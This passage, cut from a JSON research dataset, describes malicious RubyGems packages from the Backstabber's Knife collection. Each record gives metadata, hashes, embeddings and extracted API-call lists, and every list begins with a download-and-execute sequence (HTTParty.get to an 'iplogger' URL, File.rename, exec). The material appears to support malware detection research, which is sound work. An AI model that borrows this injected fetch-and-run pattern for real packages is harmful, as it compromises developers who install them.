            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require_relative', 'require_relative', 'config.payload', 'config.webhook_url', 'config.webhook_url.empty?', 'config.webhook_url', 'raise', 'ConfigError.new', 'SlackClient::IncomingWebhook.new', 'config.webhook_url', 'config.slackbot_url', 'config.slackbot_url.empty?', 'config.slackbot_url', 'raise', 'ConfigError.new', 'SlackClient::Slackbot.new', 'config.slackbot_url', 'config.webapi_token', 'config.webapi_token.empty?', 'config.webapi_token', 'raise', 'ConfigError.new', 'SlackClient::Webapi.new', '@payload.[]=', 'config.webapi_token', '@client.log=', 'Alerty.logger', 'config.https_proxy', '@client.https_proxy=', 'config.https_proxy', 'config.num_retries', 'build_payload(record).to_h', 'build_payload', 'with_retry', '@client.post_message', 'private', 'sleep', 'retries.<=', 'raise', 'deep_expand_placeholder', 'obj.each', 'obj.[]=', 'deep_expand_placeholder', 'obj.each_with_index', 'obj.[]=', 'deep_expand_placeholder', 'expand_placeholder', 'str.dup.tap', 'str.dup', 's.gsub!', 'record.[]', 's.gsub!', 'record.[]', 's.gsub!', 'record.[](:exitstatus).to_s', 'record.[]', 's.gsub!', 'record.[]', 'require', 'require', 'require', 'require', 'attr_reader', 'req_params.dup', '@req_params.[]', '@req_params.[]=', '@res.code', '@res.body', 'attr_accessor', 'attr_reader', 'self.endpoint=', 'self.https_proxy=', 'Logger.new', 'URI.parse', 'URI.parse', 'Net::HTTP.Proxy', '@https_proxy.host', '@https_proxy.port', 'proxy_class.new', 'proxy_class', 'endpoint.host', 'endpoint.port', 'http.use_ssl=', 'endpoint.scheme.==', 'endpoint.scheme', 'http.verify_mode=', 'debug_dev', 'http.set_debug_output', 'debug_dev', 'Net::HTTP::Post.new', 'endpoint.request_uri', 'req.[]=', 'endpoint.host', 'req.[]=', 'req.[]=', 'req.body=', 'encode_body', 'http.request', 'response_check', 'private', 'raise', 'res.code.!=', 'res.code', 'raise', 'Error.new', 'params.dup.tap', 'params.dup', 'p.[]', 'p.[]=', 'raise', 'params.[]', 'opts.[]', 'log.warn', 'log', 'params.[]', 'api.channels_create', 'api', 'params.[]', 'params.[]', '(retries -= 1)\\n.>=', 'raise', 'log.info', 'log', 'post', 'endpoint', 'private', 'params.to_json.gsub(/&/, \"&amp;\").gsub(/</, \"&lt;\").gsub', 'params.to_json.gsub(/&/, \"&amp;\").gsub', 'params.to_json.gsub', 'params.to_json', 'res.body.==', 'res.body', 'raise', 'Error.new', 'WebApi.new', 'https_proxy', 'params.[]', 'raise', 'with_channels_create', 'log.info', 'log', 'filter_params', 'post', 'slackbot_endpoint', 'private', 'endpoint.dup.tap', 'endpoint.dup', 'endpoint', 'e.query', 'URI.encode', 'params.[]', 'params.[]', 'params.[]', 'params.[]', 'raise', 'Array(params.[](\"attachments\")).first', 'Array', 'params.[]', 'attachment.[]', 'text.nil?', 'attachment.[]', 'Array(attachment.[](\"fields\")).first.[]', 'Array(attachment.[](\"fields\")).first', 'Array', 'attachment.[]', 'res.body.==', 'res.body', 'raise', 'ChannelNotFoundError.new', 'res.body.!=', 'res.body', 'raise', 'Error.new', '\"https://slack.com/api/\".freeze', 'URI.parse', 'URI.join', 'endpoint', 'URI.join', 'endpoint', 'with_channels_create', 'log.info', 'log', 'filter_params', 'post', 'post_message_endpoint', 'log.info', 'log', 'filter_params', 'post', 'channels_create_endpoint', 'private', 'params.dup', 'params.[]', 'body.[]=', 'params.[](\"attachments\").to_json', 'params.[]', 'URI.encode_www_form', 'JSON.parse', 'res.body', 'res_params.[]', 'res_params.[]', 'raise', 'ChannelNotFoundError.new', 'raise', 'NameTakenError.new', 'raise', 'Error.new']",
            "n_tokens": 1098,
            "embedding": "[-0.00658348 -0.01037397 -0.00017441 ...  0.00145587 -0.01861045\n  0.01362296]",
            "cluster": "0",
            "id": 217,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alerty_plugin-slack/0.0.1/alerty_plugin-slack-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alerty_plugin-slack/0.0.1/alerty_plugin-slack-0.0.1_extracted",
            "name": "alerty_plugin-slack",
            "version": "0.0.1",
            "published_at": "2020-02-20T20:48:44.146Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, alerty",
            "SHA-256": "7b72cee365289e3529e89482f9038f4d09bbe6eb1ea6cb1177713cccb104eee2"
        },
        {
            "name_version": "atlassian-plugin_installer-0.1.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/atlassian-plugin_installer/0.1.3/atlassian-plugin_installer-0.1.3_extracted/atlassian-plugin_installer-0.1.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'URI', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'url.start_with?', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'request.basic_auth', 'http.request', 'response.code', 'response.[]', 'puts', '{ \"pluginUri\" => plugin_uri }.to_json', 'URI.parse', 'Net::HTTP.new', 'uri.host', 'uri.port', 'https.use_ssl=', 'url.start_with?', 'Net::HTTP::Post.new', 'uri.request_uri', 'req.basic_auth', 'req.body=', 'req.[]=', 'req.[]=', 'https.request', 'puts', 'res.inspect', 'puts', 'URI', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'url.start_with?', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.initialize_http_header', 'request.basic_auth', 'http.request', 'response.code.==', 'response.code', 'puts', 'puts', 'puts', 'response.inspect', 'puts', 'sleep', 'puts', '{ \"rawLicense\" => license }.to_json', 'URI.parse', 'Net::HTTP.new', 'uri.host', 'uri.port', 'https.use_ssl=', 'url.start_with?', 'Net::HTTP::Put.new', 'uri.request_uri', 'req.basic_auth', 'req.body=', 'req.[]=', 'req.[]=', 'https.request', 'puts', 'res.inspect', 'res.body', 'require', 'require', 'require', 'require', 'puts', 'get_plugin_details_for_version', 'details.[]', 'raise', 'puts', 'plugin_version.==', 'make_get_request', 'offset.*', 'make_get_request', 'response.[]', 'response.[](\"_embedded\").[]', 'response.[]', 'response.[](\"_embedded\").[](\"versions\").each', 'response.[](\"_embedded\").[]', 'response.[]', 'result.<<', 'version.[]', 'puts', 'Gem::Version.new', '(0..10)\\n.each', 'get_plugin_versions(plugin_key, offset).each', 'get_plugin_versions', 'puts', 'get_plugin_details_for_version', 'version_details.[]', 'puts', '\"Version details:\".+', 'compatibilities.inspect', 'compatibilities.each', 'puts', '\"Comp: \".+', 'comp.inspect', 'version_details.[](\"status\").==', 'version_details.[]', 'comp.[]', 'comp.[](\"application\").==', 'comp.[]', 'comp.[]', 'comp.[](\"hosting\").[]', 'comp.[]', 'comp.[](\"hosting\").[]', 'comp.[]', 'compatibility_with.[](\"min\").[]', 'compatibility_with.[]', 'compatibility_with.[](\"max\").[]', 'compatibility_with.[]', 'Gem::Version.new(max_version).>=', 'Gem::Version.new', 'Gem::Version.new(min_version).<=', 'Gem::Version.new', 'version_details.[]', 'private', 'URI', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'url.start_with?', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.basic_auth', 'http.request', 'JSON.parse', 'response.body']",
            "n_tokens": 808,
            "embedding": "[-0.02017642 -0.01546989 -0.00395798 ...  0.00189949 -0.01948169\n  0.0148143 ]",
            "cluster": "0",
            "id": 305,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/atlassian-plugin_installer/0.1.3/atlassian-plugin_installer-0.1.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/atlassian-plugin_installer/0.1.3/atlassian-plugin_installer-0.1.3_extracted",
            "name": "atlassian-plugin_installer",
            "version": "0.1.3",
            "published_at": "2020-02-20T20:54:27.542Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake",
            "SHA-256": "30087bf8ac304e3010e1fecc1798c54baf49f1b1bcb69961a4e95f5291e31718"
        },
        {
            "name_version": "blade-sauce-labs_plugin-0.7.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/blade-sauce-labs_plugin/0.7.3/blade-sauce-labs_plugin-0.7.3_extracted/blade-sauce-labs_plugin-0.7.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'extend', 'include', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'autoload', 'Blade.config.interface.==', 'Blade.config.interface', 'Blade.config', 'tunnel.start', 'tunnel', 'session_manager.start', 'session_manager', 'job_manager.start', 'job_manager', 'tunnel.stop', 'tunnel', 'job_manager.stop', 'job_manager', 'at_exit', 'tunnel.stop', 'tunnel', 'Blade.config.plugins.sauce_labs', 'Blade.config.plugins', 'Blade.config', 'ENV.[]', 'config.username', 'config', 'ENV.[]', 'config.access_key', 'config', '(ENV.[](\"SAUCE_TUNNEL_TIMEOUT\") || config.tunnel_timeout || 60)\\n.to_i', 'ENV.[]', 'config.tunnel_timeout', 'config', 'debug?', 'STDERR.puts', 'config.debug.==', 'config.debug', 'config', 'desc', 'Blade::SauceLabsPlugin::Client.available_platforms_by_browser', 'puts', 'puts', 'puts', 'puts', 'browsers.keys.sort_by(&:downcase).each', 'browsers.keys.sort_by', 'browsers.keys', 'puts', 'browsers.[](name).each', 'browsers.[]', 'details.[](:versions).map', 'details.[]', 'version.to_i.to_s.==', 'version.to_i.to_s', 'version.to_i', 'version.to_i', 'puts', 'versions.join', 'puts', 'Blade::CLI.register', 'require', 'require', 'extend', 'delegate', 'connection.send', 'connection', 'req.url', 'req.headers.[]=', 'req.headers', 'req.body=', 'params.to_json', 'JSON.parse', 'request(:get, \"/rest/v1/#{username}/jobs?#{options.to_query}\").body', 'request', 'username', 'options.to_query', 'request', 'username', 'request', 'username', 'request', 'username', 'JSON.parse', 'request(:get, \"/rest/v1/users/#{username}/concurrency\").body', 'request', 'username', 'data.[](\"concurrency\").[](username).[](\"remaining\").[]', 'data.[](\"concurrency\").[](username).[]', 'data.[](\"concurrency\").[]', 'data.[]', 'username', '[].tap', 'config.browsers.each', 'config.browsers', 'config', 'case config\\nwhen String, Numeric\\n  { version: config }\\nwhen Hash\\n  config.symbolize_keys\\nelse\\n  {}\\nend.merge', 'config.symbolize_keys', 'browser.[]=', 'browser.[](:os).is_a?', 'browser.[]', 'browser.[](:os).split(\",\").map', 'browser.[](:os).split', 'browser.[]', 'Array', 'browser.[]', 'platforms.concat', 'platforms_for_browser', 'available_platforms_for_browser', 'platforms.each', 'versions_by_os.[]=', 'details.[](:versions).uniq.sort_by(&:to_f).reverse', 'details.[](:versions).uniq.sort_by', 'details.[](:versions).uniq', 'details.[]', 'browser.[](:os).any?', 'browser.[]', 'browser.[](:os).flat_map', 'browser.[]', 'browser.[](:version).is_a?', 'browser.[]', 'browser.[](:version).<', 'browser.[]', 'versions_by_os.[](browser_os).select { |v,|\\n  v =~ /^\\\\d/\\n}.first', 'versions_by_os.[](browser_os).select', 'versions_by_os.[]', 'v.=~', 'browser.[](:version).abs.to_i', 'browser.[](:version).abs', 'browser.[]', 'browser.[](:version).present?', 'browser.[]', 'Array(browser.[](:version)).map', 'Array', 'browser.[]', 'versions_by_os.[](browser_os).first', 'versions_by_os.[]', 'versions.map', 'platforms.keys.detect', 'platforms.keys', 'os.=~', 'Regexp.new', 'platforms.[](os).[](:api).[](version).first', 'platforms.[](os).[](:api).[]', 'platforms.[](os).[]', 'platforms.[]', 'platform.[]', 'platform.[]', 'platform.[]', 'versions_by_os.values.flatten.uniq', 'versions_by_os.values.flatten', 'versions_by_os.values', 'browser.[](:version).is_a?', 'browser.[]', 'browser.[](:version).<', 'browser.[]', 'all_versions.select { |v,|\\n  v =~ /^\\\\d/\\n}.first', 'all_versions.select', 'v.=~', 'browser.[](:version).abs.to_i', 'browser.[](:version).abs', 'browser.[]', 'browser.[](:version).present?', 'browser.[]', 'Array(browser.[](:version)).map', 'Array', 'browser.[]', 'all_versions.first', 'versions.map', 'platforms.detect { |os, details|\\n  details.[](:api).[](version).any?\\n}.first', 'platforms.detect', 'details.[](:api).[](version).any?', 'details.[](:api).[]', 'details.[]', 'platforms.[](os).[](:api).[](version).first', 'platforms.[](os).[](:api).[]', 'platforms.[](os).[]', 'platforms.[]', 'platform.[]', 'platform.[]', 'platform.[]', '{}.tap', 'find_browser_long_names(browser.[](:name)).each', 'find_browser_long_names', 'browser.[]', 'available_platforms_by_browser.[](long_name).each', 'available_platforms_by_browser.[]', 'available_platforms_by_browser', 'platforms.[]', 'platforms.[](os).[]=', 'platforms.[]', '(platforms.[](os).[](:versions) + details.[](:versions)).compact.uniq', '(platforms.[](os).[](:versions) + details.[](:versions))\\n.compact', 'platforms.[](os).[](:versions).+', 'platforms.[](os).[]', 'platforms.[]', 'details.[]', 'details.[](:api).each', 'details.[]', 'platforms.[](os).[](:api).[]', 'platforms.[](os).[]', 'platforms.[]', 'platforms.[](os).[](:api).[]=', 'platforms.[](os).[]', 'platforms.[]', '(platforms.[](os).[](:api).[](key) + values).compact.uniq', '(platforms.[](os).[](:api).[](key) + values)\\n.compact', 'platforms.[](os).[](:api).[](key).+', 'platforms.[](os).[](:api).[]', 'platforms.[](os).[]', 'platforms.[]', 'platforms.[](os).[](:api).[]=', 'platforms.[](os).[]', 'platforms.[]', 'platforms.[]=', '{}.tap', 'available_platforms.group_by { |p,|\\n  [p.[](:device), p.[](:api_name)].compact.join(\":\")\\n}.each', 'available_platforms.group_by', 'available_platforms', '[p.[](:device), p.[](:api_name)].compact.join', '[p.[](:device), p.[](:api_name)].compact', 'p.[]', 'p.[]', 'platforms.first.[]', 'platforms.first', 'by_browser.[]=', 'platforms.group_by { |p,|\\n  p.[](:os).split(\" \").first\\n}.each', 'platforms.group_by', 'p.[](:os).split(\" \").first', 'p.[](:os).split', 'p.[]', 'by_browser.[](long_name).[]=', 'by_browser.[]', 'by_browser.[](long_name).[](os).[]=', 'by_browser.[](long_name).[]', 'by_browser.[]', 'by_browser.[](long_name).[](os).[]=', 'by_browser.[](long_name).[]', 'by_browser.[]', 'platforms.map { |p,|\\n  p.[](:short_version)\\n}.uniq.sort_by(&:to_f).reverse', 'platforms.map { |p,|\\n  p.[](:short_version)\\n}.uniq.sort_by', 'platforms.map { |p,|\\n  p.[](:short_version)\\n}.uniq', 'platforms.map', 'p.[]', 'versions.each', 'by_browser.[](long_name).[](os).[](:versions).<<', 'by_browser.[](long_name).[](os).[]', 'by_browser.[](long_name).[]', 'by_browser.[]', 'by_browser.[](long_name).[](os).[](:api).[]=', 'by_browser.[](long_name).[](os).[]', 'by_browser.[](long_name).[]', 'by_browser.[]', 'platforms.map { |platform,|\\n  if platform.[](:short_version) == version\\n    platform.values_at(:os, :api_name, :short_version)\\n  end\\n}.compact', 'platforms.map', 'platform.[](:short_version).==', 'platform.[]', 'platform.values_at', 'private', 'Faraday.new', 'username', 'access_key', 'faraday.adapter', 'Faraday.default_adapter', 'faraday.request', 'debug?', 'faraday.response', 'Regexp.new', 'available_platforms_by_browser.keys.select', 'available_platforms_by_browser.keys', 'available_platforms_by_browser', 'long_name.=~', 'JSON.parse(connection.get(\"/rest/v1/info/platforms/webdriver\").body).map', 'JSON.parse', 'connection.get(\"/rest/v1/info/platforms/webdriver\").body', 'connection.get', 'connection', 'delegate', 'attr_reader', 'config.symbolize_keys', 'Blade::SauceLabsPlugin::WebDriver.new', 'change_state', 'web_driver.callback', 'web_driver', 'start_tests', 'web_driver.errback', 'web_driver', 'fail', 'web_driver.start', 'web_driver', 'web_driver.navigate_to', 'web_driver', 'Blade.url', 'web_driver.session_id', 'web_driver', 'web_driver.get_cookie', 'web_driver', '@id.present?', '@session_id.present?', 'succeed', 'fail', 'fail', 'completed?', 'web_driver.stop', 'web_driver', 'change_state', 'client.stop_job(id).success?', 'client.stop_job', 'client', 'id', 'change_state', 'client.update_job', 'client', 'id', 'id', 'stop', 'EM.add_periodic_timer', 'client.delete_job(job_id).success?', 'client.delete_job', 'client', 'timer.cancel', 'tries.==', 'timer.cancel', '@id.present?', 'find_id', 'private', 'config.[]', 'config', 'config.[]', 'config', 'config.[]', 'config', 'client.get_jobs({ full: true }).each', 'client.get_jobs', 'client', 'job.symbolize_keys!', 'match.all?', 'job.[](key).==', 'job.[]', 'job.[]', 'extend', 'delegate', 'cattr_accessor', 'EM::Queue.new', 'cattr_accessor', 'enqueue_jobs', 'process_queue', 'Blade.subscribe', 'details.[]', 'EM.add_timer', 'process_queue', 'jobs.each', 'jobs', 'private', 'client.platforms.each', 'client.platforms', 'client', 'job_queue.<<', 'job_queue', 'Job.new', 'platform.merge', 'test_params', 'job_queue.empty?', 'job_queue', 'client.get_available_vm_count', 'client', 'vm_count.zero?', 'wait_for_available_vm', 'vm_count.times', 'job_queue.pop', 'job_queue', 'job.callback', 'jobs.<<', 'jobs', 'session_manager.update', 'session_manager', 'job.session_id', 'job.errback', 'job.retries.==', 'job.retries', 'exit', 'job.stop_and_delete', 'job_queue.<<', 'job_queue', 'Job.new', 'job.config', 'job.retries.+', 'job.retries', 'EM.next_tick', 'process_queue', 'job.start', 'EM.add_periodic_timer', 'client.get_available_vm_count.zero?', 'client.get_available_vm_count', 'client', '@vm_timer.cancel', 'process_queue', 'camelize_keys', 'combined_test_config', 'default_test_config.merge(env_test_config).merge(test_config).select', 'default_test_config.merge(env_test_config).merge', 'default_test_config.merge', 'default_test_config', 'env_test_config', 'test_config', 'v.present?', 'config.test_config', 'config', 'Blade::SauceLabsPlugin::Tunnel.identifier', 'default_build', '{}.tap', 'get_env_value', 'get_env_value', 'config.[]=', '[:commit, :repo_slug, :pull_request].each', 'tag_from_env', 'tags.<<', 'tags.any?', 'config.[]=', 'get_env_value', '[key, value].join', 'key.to_s.upcase', 'key.to_s', 'ENV.[]', 'ENV.[]', '[rev, Time.now.utc.to_i].select(&:present?).join', '[rev, Time.now.utc.to_i].select', 'rev', 'Time.now.utc.to_i', 'Time.now.utc', 'Time.now', '`git rev-parse HEAD 2>/dev/null`.chomp', '{}.tap', 'hash.each', 'result.[]=', 'key.to_s.camelize', 'key.to_s', 'extend', 'delegate', 'mattr_accessor', 'Hash.new', 'Blade.config.expected_sessions=', 'Blade.config', 'client.platforms.size', 'client.platforms', 'client', 'handle_completed_jobs', 'sessions.[]', 'sessions', 'sessions.[](session_id).merge!', 'sessions.[]', 'sessions', 'sessions.[]=', 'sessions', 'session.has_key?', 'session.has_key?', 'session.[](:job).update', 'session.[]', 'session.[]', 'session.[](:job).stop', 'session.[]', 'private', 'Blade.subscribe', 'details.[]', 'details.[](:state).!=', 'details.[]', 'update', 'details.[]', 'require', 'require', 'extend', 'extend', 'def_delegators', 'attr_reader', 'SecureRandom.hex', 'create_child_process', 'Time.now', 'EM::PeriodicTimer.new', 'ready_file_exists?', 'timer.cancel', 'debug?.!', 'debug?', 'Time.now.-', 'Time.now', 'elapsed.>', 'tunnel_timeout', 'timer.cancel', 'STDERR.puts', 'STDERR.puts', 'tunnel_io.tap(&:rewind).read', 'tunnel_io.tap', 'tunnel_io', 'exit', 'tunnel_io.unlink', 'tunnel_io', '@process.stop', 'debug', 'private', 'ChildProcess.build(tunnel_command, *tunnel_args).tap', 'ChildProcess.build', 'tunnel_command', 'tunnel_args', 'debug?', 'process.io.inherit!', 'process.io', 'process.io.stdout=', 'process.io', 'process.io.stderr=', 'process.io', 'tunnel_io', 'process.duplex=', 'process.leader=', 'process.environment.merge!', 'process.environment', 'tunnel_env', 'process.start', 'debug', 'process.inspect', 'Pathname.new(File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/blade-sauce-labs_plugin/0.7.3/blade-sauce-labs_plugin-0.7.3_extracted/blade-sauce-labs_plugin-0.7.3_sourcecode.rb\")).join(\"../../../support/sc-#{os}/bin/sc\").to_s', 'Pathname.new(File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/blade-sauce-labs_plugin/0.7.3/blade-sauce-labs_plugin-0.7.3_extracted/blade-sauce-labs_plugin-0.7.3_sourcecode.rb\")).join', 'Pathname.new', 'File.dirname', 'os', '[\"--tunnel-identifier\", identifier, \"--readyfile\", ready_file_path].+', 'identifier', 'ready_file_path', 'Array', 'config.tunnel_args', 'config', 'username', 'access_key', 'Tempfile.new(\"blade_sauce_tunel_#{identifier}\").tap', 'Tempfile.new', 'identifier', 'io.sync=', 'Blade.tmp_path.join(\"sauce_tunnel_#{identifier}_ready\").to_s', 'Blade.tmp_path.join', 'Blade.tmp_path', 'identifier', 'File.exists?', 'ready_file_path', 'ready_file_exists?', 'File.unlink', 'ready_file_path', 'RUBY_PLATFORM.downcase', 'require', 'delegate', 'cattr_accessor', 'username', 'access_key', 'attr_reader', 'attr_reader', 'EM.defer', 'get_driver', 'succeed', 'fail', 'EM.defer', 'quit_driver', 'completed?', 'EM.defer', 'driver.navigate.to', 'driver.navigate', 'driver', 'Time.now', 'EM.tick_loop', 'driver.current_url.==', 'driver.current_url', 'driver', 'Time.now - start.>', 'Time.now.-', 'Time.now', 'active?', 'driver.session_id', 'driver', 'active?', 'driver.manage.cookie_named', 'driver.manage', 'driver', 'name.to_s', 'cookie.[]', 'private', 'Selenium::WebDriver.for', 'url', 'http_client', 'capabilities', 'driver.manage.timeouts.implicit_wait=', 'driver.manage.timeouts', 'driver.manage', 'active?', 'driver.quit', 'driver', 'Selenium::WebDriver::Remote::Http::Default.new', 'client.respond_to?', 'client.open_timeout=', 'client.read_timeout=', 'client.timeout=']",
            "n_tokens": 4016,
            "embedding": "[-0.01495492 -0.03466957 -0.00693881 ... -0.00103384 -0.02938099\n  0.01487657]",
            "cluster": "0",
            "id": 124,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/blade-sauce-labs_plugin/0.7.3/blade-sauce-labs_plugin-0.7.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/blade-sauce-labs_plugin/0.7.3/blade-sauce-labs_plugin-0.7.3_extracted",
            "name": "blade-sauce-labs_plugin",
            "version": "0.7.3",
            "published_at": "2020-02-20T20:57:35.799Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, blade, rake, webmock, selenium-webdriver, faraday, childprocess",
            "SHA-256": "62080329f70130aee7b2e82f5cdf9995573d697063f1f9d743a3321b3cf3c431"
        },
        {
            "name_version": "bosh_plugin-generator-0.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bosh_plugin-generator/0.0.1/bosh_plugin-generator-0.0.1_extracted/bosh_plugin-generator-0.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + \"/\" + \"iplogger\" + e.+', 'd + \"/\" + \"iplogger\".+', 'd + \"/\".+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'include', 'usage', 'desc', 'option', 'option', 'option', 'option', '\"type of license file included to plugin repository\".+', 'extract_options', 'say', '\"Generating BOSH CLI plugin...\".make_green', 'generate_files', 'say', '\"DONE. \".make_green', 'say', 'File.join', 'Dir.pwd', 'require', 'require', 'include', 'require', 'require', 'require', 'require', 'attr_accessor', 'File.dirname', 'FileUtils.mkdir_p', 'File.read', 'File.join', 'source_folder', 'Erubis::Eruby.new(template).result', 'Erubis::Eruby.new', 'context', 'File.write', 'private', 'options.[]', 'options', 'Dir.pwd', 'require', 'attr_accessor', 'extend', 'def_delegator', 'options.[]', 'options', 'File.join', 'File.join', 'File.join', 'lib_folder', 'short_plugin_name', 'File.join', 'lib_folder', 'Git.global_config.[]', 'Git.global_config', 'Git.global_config.[]', 'Git.global_config', 'full_plugin_name', 'short_plugin_name', 'short_plugin_name.split(\"_\").collect(&:capitalize).join', 'short_plugin_name.split(\"_\").collect', 'short_plugin_name.split', 'short_plugin_name', 'default_context.merge', 'options', 'context.[](:email).nil?', 'context.[]', 'context.[](:author).nil?', 'context.[]', 'raise', 'File.expand_path', 'Bosh::PluginGenerator::Generator.new', 'generate_command_class', 'generate_helpers', 'generate_version', 'generate_gemspec', 'generate_readme', 'license?', 'generate_license', 'generate_developer_environment', 'private', 'plugin_name.include?', 'plugin_name', 'plugin_name.start_with?', 'plugin_name', 'plugin_name', '[\"bosh\", plugin_name].join', 'plugin_name', 'plugin_name.gsub', 'plugin_name', '!@license_type.!', '@license_type.!', 'generate', 'File.join', 'lib_folder', 'short_plugin_name', 'generate', 'File.join', 'commands_folder', 'short_plugin_name', 'generate', 'File.join', 'helpers_folder', 'generate', 'File.join', 'helpers_folder', 'generate', 'File.join', 'plugin_name', 'full_plugin_name', 'generate', 'File.join', 'plugin_name', 'generate', 'File.join', 'plugin_name', 'generate', 'File.join', 'plugin_folder', 'generate', 'File.join', 'plugin_folder', 'generate', 'File.join', 'generate', 'File.join', 'generate', 'File.join', 'plugin_folder', 'generate', 'File.join', 'plugin_folder', 'describe', 'let', 'let', 'Dir.mktmpdir', 'let', 'File.join', 'tmpdir', 'subject', 'Bosh::PluginGenerator::Generator.new', 'context', 'File.expand_path', 'after', 'FileUtils.remove_entry_secure', 'tmpdir', 'describe', 'before', 'subject.generate', 'subject', 'target', 'context', 'it', 'expect(File).to', 'expect', 'exist', 'target', 'it', 'expect(File.read(target)).to', 'expect', 'File.read', 'target', 'match', 'describe', 'describe', 'before', 'Dir.pwd', 'Dir.mktmpdir', 'Dir.chdir', 'after', 'Dir.chdir', 'FileUtils.remove_entry_secure', 'context', 'let', 'File.join', 'Dir.pwd', 'before', 'system', 'it', 'File.join', 'plugin_folder', 'expect(File).to', 'expect', 'exist', 'expect(File.read(gemspec_file)).to', 'expect', 'File.read', 'match', 'it', 'expect(File.read(\"#{plugin_folder}/bosh-magic.gemspec\")).to', 'expect', 'File.read', 'plugin_folder', 'include', 'Git.global_config.[]', 'Git.global_config', 'expect(File.read(\"#{plugin_folder}/bosh-magic.gemspec\")).to', 'expect', 'File.read', 'plugin_folder', 'include', 'Git.global_config.[]', 'Git.global_config', 'it', 'expect(File).not_to', 'expect', 'exist', 'File.join', 'plugin_folder', 'context', 'let', 'File.join', 'Dir.pwd', 'before', 'system', 'it', 'expect(File).to', 'expect', 'exist', 'plugin_folder', 'it', 'File.join', 'plugin_folder', 'expect(File).to', 'expect', 'exist', 'expect(File.read(gemspec_file)).to', 'expect', 'File.read', 'match', 'it', 'expect(File.read(\"#{plugin_folder}/bosh-magic.gemspec\")).to', 'expect', 'File.read', 'plugin_folder', 'match', 'it', 'expect(File).to', 'expect', 'exist', 'File.join', 'plugin_folder', 'ENV.[]', 'File.expand_path', 'require', 'require', 'Bundler.setup', '$:.unshift', 'File.expand_path', 'require', 'require', 'require', 'File.expand_path', 'File.join', 'describe', 'before', 'system', 'it', 'expect($?.exitstatus).to', 'expect', '$?.exitstatus', 'eq', 'ENV.[]', 'File.expand_path', 'require', 'require', 'Bundler.setup', '$:.unshift', 'File.expand_path', 'require', 'require', 'require']",
            "n_tokens": 1270,
            "embedding": "[-0.00129433 -0.01820436 -0.00586967 ... -0.00086766 -0.01627279\n  0.01062803]",
            "cluster": "0",
            "id": 263,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bosh_plugin-generator/0.0.1/bosh_plugin-generator-0.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bosh_plugin-generator/0.0.1/bosh_plugin-generator-0.0.1_extracted",
            "name": "bosh_plugin-generator",
            "version": "0.0.1",
            "published_at": "2020-02-20T20:58:11.864Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rspec, rspec-its, rake, rubocop, rspec-mocks, bosh_cli, bosh_common, semi_semantic, membrane, git, erubis",
            "SHA-256": "10fb2c5b48cd804b5da5dcf98892a71836d86331b5835eb25d6558e9b84f0873"
        },
        {
            "name_version": "bosh-cli_plugin_redis-0.2.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bosh-cli_plugin_redis/0.2.3/bosh-cli_plugin_redis-0.2.3_extracted/bosh-cli_plugin_redis-0.2.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
